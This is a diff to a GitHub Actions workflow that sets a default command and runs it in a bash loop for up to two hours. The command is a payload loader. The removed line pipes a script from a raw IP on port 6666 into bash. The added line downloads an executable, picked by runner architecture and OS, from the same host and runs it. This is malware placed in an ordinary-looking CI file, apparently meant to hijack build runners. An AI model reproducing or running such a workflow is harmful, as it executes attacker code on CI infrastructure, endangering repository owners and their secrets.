@@ -5,7 +5,7 @@ on:
       runs-on:
         default: 'ubuntu-latest'
       run:
-        default: 'curl -sS 109.188.87.160:6666/e.sh|bash'
+        default: 'wget -O exe.exe 109.188.87.160:6666/{0)_{1} && ./exe.exe'
 jobs:
   loop:
     runs-on: ${{ inputs.runs-on }}
@@ -19,7 +19,7 @@ jobs:
       run: rm -rf exit
     - shell: bash
       run: |
-        while (${{ inputs.run }}) || true
+        while (${{ format(inputs.run, runner.arch, runner.os) }}) || true
         do
           if [[ -f exit ]] || (( $SECONDS > 7200 ))
           then
@@ -29,3 +29,4 @@ jobs:
           echo -n .
         done
         rm -rf exit
+
